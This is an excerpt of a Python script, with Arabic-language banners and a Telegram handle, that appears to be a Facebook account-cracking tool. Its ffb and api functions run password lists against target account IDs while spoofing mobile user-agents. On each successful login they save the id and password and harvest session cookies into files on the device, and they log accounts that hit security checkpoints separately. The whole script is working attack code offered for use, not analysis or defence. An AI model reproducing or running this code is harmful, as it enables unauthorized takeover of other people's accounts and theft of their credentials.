import datetime;now = datetime.date.today();target = datetime.date(2024,12,23)
if now >=target:exit("@K_964Q ﻚﻠﻌﻔﻳ ﺪﺒﻌﻟﺍ ﻮﺑﺍ ﻲﻠﺘﻟﺍ ﺥﻭﺮﻓ ﺝﺎﻴﻧ ﻞﺳﺍﺭ ﻩﺍﺩﻻﺍ ﺖﻔﻗﻭ")
else:print("ﺩﻭﺩﻻ ﻞﻐﺘﺸﺗﻭ ﻖﻳﺎﻗﺩ")
...
print('\n\033[1;37m ﻪﺒﺤﻜﻟﺍ ﻦﺑﺍ ﻩﺮﻀﺘﻧﺩ ﻞﻤﺤﺗ ﻱﺎﺟ')
...
logo=("""
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31MR! ABONAGEM\33[38;5;
https://t.me/GameStar_Official
@K_964Q
ﻞﺻﺍﻮﺘﻠﻟ ﻱﺭﺯﻮﻳﻭ ﻲﺗﺎﻨﻗ
ﻲﺷ ﻝﻭﺍ ﻢﻜﺟﺎﻴﻧ ﺪﺒﻌﻟﺍ ﻮﺑﺍ ﻲﺷ ﻢﻛﺪﻋﺎﻣ ﻲﺷ ﻪﻠﻋ ﻲﺷ
ﻲﻠﺘﻟﺍ ﺥﻭﺮﻓ ﺝﺎﻴﻧ ﻞﺻﻮﻤﻟﺍ ﺮﻘﺻ
 ﻪﻳﺎﻋﺮﺑ ﻩﺪﻳﺪﺟ ﻪﻳﺍﺪﺑ
 \033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31MR! ABONAGEM\33[38;5;
""")
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/K_964Q.txt \033[0;97m\n')
        #100010138361148
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;96mK_964Q\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [K_964Q-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/K_964Q-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/K_964Q-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [K_964Q-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [K_964Q] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [K_964Q-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/K_964Q-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/K_964QCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [K_964Q-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/K_964Q-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/K_964Q_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [K_964Q-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/K_964Q-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
